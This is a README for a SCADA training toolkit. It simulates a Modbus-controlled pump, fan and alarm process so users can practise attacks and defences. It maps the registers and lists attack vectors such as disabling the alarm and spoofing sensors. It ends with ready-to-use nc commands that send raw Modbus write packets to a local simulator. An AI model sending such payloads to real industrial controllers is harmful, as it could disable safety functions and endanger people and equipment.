# OT Simulation Toolkit - README

This toolkit is a modular “toolbox” of industrial process simulations. Each module simulates a SCADA environment using a different protocol (e.g., MODBUS, DNP3, GOOSE) to demonstrate attacks and countermeasures.

## Module Contents

Each protocol-specific module includes:
1. `requirements.txt` for Python dependencies.
2. Main controller simulation script (e.g. `modbus-plc1.py` or  `goose-BIED1-subscriber.py`, etc...).
3. HMI simulation showing process status.
4. `reality-loop.py` for background sensor behavior simulation.
5. `OTdemo.conf` configuration file (shared format, module-specific section).

## Installation & Usage

### Step 1: Setup
- Copy all files into the same directory.
- Use separate terminals for running modules.

### Step 2: Terminal 1 – Start Main Module
- Launch the main controller simulation.
- The display shows values and logic iteration count.

### Step 3: Terminal 2 – Start HMI Simulation
- Launch the HMI to view the controller memory state.
- This is independent from how MEMORY_VIEW is set in the config

### Step 4: Terminal 3 – Start Reality Loop
- Start `reality-loop.py` in the background (`&`) and tail the log.
- You can pause (SIGINT) or cleanly exit (SIGTERM) the process.

### Step 5: Observe and Attack
- If you have several modules, apply above instructions to all of them.
- Watch how sensor values evolve.
- Send crafted Modbus packets and analyze effects.

---

## Files and Configurations

### `sensors.json`
Created at startup if it does not already exist, defines initial values. Can be modified to simulate different startup conditions.

### `sensors.tmp`
Shared between controller and reality-loop. Used as simulated PLC memory.

### `OTdemo.conf`
Configuration file. Each module reads its section for:
- `JSON_FILE`
- `TMP_FILE`
- `PLC_LOG_FILE`
- `PLC_SERVER_IP`
- `PLC_SERVER_PORT`
- `REALITY_LOG_FILE`
- `PRINT_STATUS_CYCLE`
- `PLC_LOOP_MULTIPLIER`
- `REALITY_CYCLE`
- `HMI_POLL_INTERVAL`
- `MEMORY_VIEW`

---

## Memory View Modes

`MEMORY_VIEW = True`
- Memory printed every logic cycle.
- Logic updates happen every Nth cycle.
- Great for observing changes before PLC logic reacts.

`MEMORY_VIEW = False`
- Memory only printed after logic cycles.
- Only finalized values visible.

---

## Module: MODBUS

The MODBUS simulation models a "magic liquid" through a tube. Pressure and temperature increase with pump activity. The PLC controls fan and pump voltages to regulate the process.

---

## PLC Logic

### 1. Mode Handling
- **HR[5] = 0**: Skip PLC logic (Idle)
- **HR[5] = 1**: Run normal logic

### 2. Emergency Stop
- **Coil[3] = 1**: Set IR[0], IR[4] to 0 (pump & fan off), skip logic

### 3. Pump Control (IR[0])
- Adjust voltage to maintain pressure near HR[2]

### 4. Fan Control (IR[4])
- Adjust voltage to maintain temperature near HR[1]

### 5. Alarm Logic (Coil[1])
- ON if temperature > HR[3] or pressure > HR[4]

### 6. Fan State (DI[2])
- ON if IR[4] > 0

### 7. Safety Logic
- If Door open (DI[0] = 0) and fan ON → set DI[1] = 0, turn fan off

---

## Modbus Field Table

| Type             | Index | Name                      | Description                                         | Controlled By | Affects / Affected By                                      |
|------------------|-------|---------------------------|-----------------------------------------------------|---------------|-------------------------------------------------------------|
| Coil             | 0     | Pump                      | Starts flow through tube                            | PLC Logic     | Affects pressure and throughput                             |
| Coil             | 1     | Alarm                     | Signals unsafe conditions                           | PLC Logic     | Indicates temp/pressure danger                              |
| Coil             | 2     | Fan                       | Enables cooling                                     | PLC Logic     | Controls temperature                                        |
| Coil             | 3     | Emergency Stop            | Force safety halt                                   | Interactive   | Disables fan/pump, causes pressure/temperature rise         |
| Discrete Input   | 0     | Door Closed               | Panel state                                         | Interactive   | Impacts fan safety logic                                    |
| Discrete Input   | 1     | Safety OK                 | Derived from logic                                  | PLC Logic     | Blocks pump/fan if false                                    |
| Discrete Input   | 2     | Fan Active                | Derived from fan voltage                            | PLC Logic     | Status signal                                               |
| Input Register   | 0     | Pump Voltage              | Pump power                                          | PLC Logic     | Directly changes pressure/flow                              |
| Input Register   | 1     | Temperature               | Current temp                                        | Reality Loop  | Driven by pressure/fan activity                             |
| Input Register   | 2     | Pressure                  | Current pressure                                    | Reality Loop  | Increases with pump voltage                                 |
| Input Register   | 3     | Throughput                | Calculated flow                                     | Reality Loop  | Affected by pressure/temp                                   |
| Input Register   | 4     | Fan Voltage               | Fan power                                           | PLC Logic     | Higher = better cooling                                     |
| Holding Register | 0     | Fan Power (ref)           | Display only                                        | Interactive   | Not used directly                                           |
| Holding Register | 1     | Target Temperature        | Temp setpoint                                       | Interactive   | Fan logic reference                                         |
| Holding Register | 2     | Target Pressure           | Pressure setpoint                                   | Interactive   | Pump logic reference                                        |
| Holding Register | 3     | Alarm Temp Threshold      | Trigger temp                                        | Interactive   | For alarm                                                   |
| Holding Register | 4     | Alarm Pressure Threshold  | Trigger pressure                                    | Interactive   | For alarm                                                   |
| Holding Register | 5     | Mode                      | Run/Idle                                            | Interactive   | Enables/disables PLC logic                                  |

---

## Attack Vectors

| Target         | Address   | Description                    | Impact on Process                                              |
|----------------|-----------|--------------------------------|----------------------------------------------------------------|
| Pump           | Coil[0]   | Force pump OFF                | Flow stops, pressure drops                                     |
| Fan            | Coil[2]   | Force fan OFF                 | Temp rises, system overheats                                   |
| Emergency Stop | Coil[3]   | Trigger emergency             | System halts all activity                                      |
| Alarm          | Coil[1]   | Disable alarm                 | Hides dangerous conditions                                     |
| Temp Sensor    | IR[1]     | Spoof low temp                | Fan underreacts → heat buildup                                 |
| Pressure       | IR[2]     | Spoof low pressure            | Pump overcompensates                                           |
| Target Temp    | HR[1]     | Raise setpoint                | Delays fan response                                            |
| Alarm Press    | HR[4]     | Raise alarm threshold         | Danger not reported                                            |
| Mode           | HR[5]     | Set to Idle                   | PLC logic stops                                                |

---

## Attack Payloads

| Goal             | Target    | Command (nc)                                                                 |
|------------------|-----------|------------------------------------------------------------------------------|
| Pump OFF         | Coil[0]   | `echo -ne '\x00\x01\x00\x00\x00\x06\x01\x05\x00\x00\x00\x00' \| nc 127.0.0.1 5020` |
| Fan OFF          | Coil[2]   | `echo -ne '\x00\x02\x00\x00\x00\x06\x01\x05\x00\x02\x00\x00' \| nc 127.0.0.1 5020` |
| Emergency Stop   | Coil[3]   | `echo -ne '\x00\x03\x00\x00\x00\x06\x01\x05\x00\x03\xFF\x00' \| nc 127.0.0.1 5020` |
| Alarm Mask       | Coil[1]   | `echo -ne '\x00\x04\x00\x00\x00\x06\x01\x05\x00\x01\x00\x00' \| nc 127.0.0.1 5020` |
| Spoof Temp       | IR[1]     | `echo -ne '\x00\x05\x00\x00\x00\x06\x01\x06\x00\x01\x00\x0F' \| nc 127.0.0.1 5020` |
| Spoof Pressure   | IR[2]     | `echo -ne '\x00\x06\x00\x00\x00\x06\x01\x06\x00\x02\x00\x64' \| nc 127.0.0.1 5020` |
| Raise Temp SP    | HR[1]     | `echo -ne '\x00\x07\x00\x00\x00\x06\x01\x06\x00\x01\x00\x4B' \| nc 127.0.0.1 5020` |

---
